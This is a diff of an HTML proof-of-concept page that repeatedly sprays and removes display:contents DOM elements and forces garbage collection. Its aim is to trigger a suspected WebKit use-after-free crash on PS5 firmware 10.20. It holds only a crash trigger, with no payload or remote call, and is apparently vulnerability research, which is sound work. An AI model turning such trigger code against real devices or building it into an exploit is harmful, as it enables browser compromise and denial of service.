@@ -1,48 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit UAF Crash PoC</title>
+  <title>WebKit Crash PoC - PS5 FW 10.20</title>
   <style>
-    #target {
-      display: contents;
+    body {
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+    }
+    #log {
+      white-space: pre;
     }
   </style>
 </head>
 <body>
-  <div id="log">Running PoC...</div>
+  <div id="log">[+] Running PoC...</div>
+
   <script>
-    function log(msg) {
-      document.getElementById('log').textContent += '\n' + msg;
-    }
+    const log = (msg) => document.getElementById("log").textContent += `\n${msg}`;
 
-    function stressTest() {
-      for (let i = 0; i < 10000; i++) {
+    function sprayDOM(depth) {
+      for (let i = 0; i < depth; i++) {
         let outer = document.createElement("div");
-        outer.id = "target";
+        outer.style.display = "contents";
 
-        let inner = document.createElement("span");
-        inner.textContent = "trigger";
+        for (let j = 0; j < 10; j++) {
+          let child = document.createElement("span");
+          child.textContent = "CrashMe" + j;
+          outer.appendChild(child);
+        }
 
-        outer.appendChild(inner);
         document.body.appendChild(outer);
 
-        // Forzar layout
-        getComputedStyle(inner).color;
-
-        // Intentar invalidar renderización
-        outer.remove();
+        // Forzar layout y luego eliminar en distintos momentos
+        getComputedStyle(outer).color;
+        if (i % 3 === 0) outer.remove(); // parcial
+        if (i % 7 === 0) document.body.innerHTML = ""; // full flush
       }
-      log("Finished spraying. Now attempting GC...");
-
-      // Forzar GC si es posible
-      try {
-        if (window.gc) window.gc();
-      } catch (e) {}
-
-      log("PoC ejecutado. Observa si hay crash o cuelgue.");
     }
 
-    setTimeout(stressTest, 1000);
+    function loopSpray() {
+      log("[*] Starting aggressive spray...");
+      let i = 0;
+      const interval = setInterval(() => {
+        sprayDOM(1000);
+
+        try {
+          if (window.gc) window.gc(); // Forzar GC si está disponible
+        } catch (e) {}
+
+        log(`[+] Cycle ${i++} done`);
+        if (i > 20) {
+          clearInterval(interval);
+          log("[!] PoC completed. If no crash, patch may be in place.");
+        }
+      }, 250);
+    }
+
+    setTimeout(loopSpray, 1000);
   </script>
 </body>
 </html>
